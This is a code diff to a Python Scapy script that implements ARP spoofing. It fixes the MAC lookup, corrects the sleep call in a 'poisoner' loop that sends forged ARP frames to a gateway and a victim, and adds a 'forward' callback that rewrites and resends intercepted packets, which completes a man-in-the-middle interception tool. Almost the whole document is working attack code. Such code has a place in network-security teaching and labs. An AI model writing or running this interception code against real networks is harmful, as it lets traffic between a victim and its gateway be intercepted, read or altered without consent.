@@ -19,10 +19,10 @@ def MAC_for_IP(given_IP, timeout=2, retry=2, verbose=0):
                       receiving an answer (default=2)
         verbose     : Verbosity level (default=0)
     """
-    broadcast_arp_frame = Ether(dst=BROADCAST_MAC)/ARP(op="who-has", pdst=given_IP)
-    recv = srp1(broadcast_arp_frame, timeout=timeout, retry=-retry, verbose=verbose)
+    broadcast_arp_frame = ARP(op="who-has", pdst=given_IP)
+    recv = sr1(broadcast_arp_frame, timeout=timeout, retry=-retry, verbose=verbose)
     if recv is not None:
-        return recv.payload.hwsrc
+        return recv.hwsrc
     return None
 
 
@@ -71,7 +71,7 @@ def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0, interval=1, duratio
     while time.time() < end_time:
         send(frame_to_gateway)
         send(frame_to_victim)
-        sleep(interval)
+        time.sleep(interval)
         n_times += 1
     return n_times
 
@@ -114,3 +114,22 @@ def doctor(gateway_IP, victim_IP, verbose):
 
     if verbose > 0:
         print("done")
+
+
+def forward(packet):
+    """
+    Callback function for forwarding packets to intended location
+
+    Args:
+        packet  : Packet to manipulate
+    """
+    src_IP = packet[IP].src
+    dst_IP = packet[IP].dst
+    src_MAC = MAC_for_IP(src_IP)
+    dst_MAC = MAC_for_IP(dst_IP)
+    packet[Ether].src = src_MAC
+    packet[Ether].dst = dst_MAC
+    packet[IP].src = src_IP
+    packet[IP].dst = dst_IP
+    print("src_IP : {}, dst_IP : {}".format(src_IP, dst_IP))
+    send(packet, verbose=False)
